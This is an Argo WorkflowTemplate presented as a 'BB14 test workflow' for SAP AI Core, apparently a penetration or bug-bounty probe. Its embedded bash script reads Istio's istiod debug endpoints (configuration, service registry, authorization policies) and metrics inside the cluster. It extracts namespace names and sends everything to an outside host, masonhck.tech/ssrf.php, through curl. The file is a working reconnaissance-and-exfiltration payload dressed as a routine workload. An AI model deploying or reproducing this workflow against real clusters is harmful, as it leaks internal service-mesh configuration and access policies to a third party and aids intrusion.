apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "42.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        CB="https://www.masonhck.tech/ssrf.php"
        ISTIOD="istiod.istio-system.svc.cluster.local"
        for ep in endpointz configz registryz authorizationz; do
          D=$(curl -s --connect-timeout 5 "http://${ISTIOD}:8080/debug/${ep}" 2>&1 | head -c 2000)
          echo "$D" | curl -s "${CB}?src=v42-${ep}&len=${#D}" --data-urlencode "d@-" > /dev/null
        done
        M=$(curl -s --connect-timeout 5 "http://${ISTIOD}:15014/metrics" 2>&1)
        NS=$(echo "$M" | grep -oP 'namespace="[^"]*"' | sort -u)
        echo "$NS" | curl -s "${CB}?src=v42-namespaces" --data-urlencode "d@-" > /dev/null
        echo "V42 NS=$(echo "$NS" | wc -l) DONE"
